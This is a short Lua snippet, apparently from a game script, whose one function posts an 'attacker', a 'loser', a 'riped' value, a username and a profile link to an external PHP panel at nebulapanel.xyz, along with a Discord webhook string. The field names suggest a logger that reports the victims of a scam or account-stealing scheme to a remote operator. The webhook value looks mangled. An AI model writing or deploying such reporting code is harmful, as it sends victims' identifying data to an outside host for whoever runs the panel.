local webhook_real = 'ourdisckord/webn/whokmsad'
function sendDiscordMessage(attacker, loser, riped, username, profileLink)
    local postData = {
        attacker = attacker or "N/A",
        loser = loser,
        Webhook = webhook_real,
        riped = riped,
        Username = username,
        Profile_Link = profileLink
    }

    http.Post("http://www.nebulapanel.xyz/other/real.php", postData, function(response)
        print(response)
    end, function(errorMsg)
        print("Error sending message: " .. errorMsg)
    end)
end
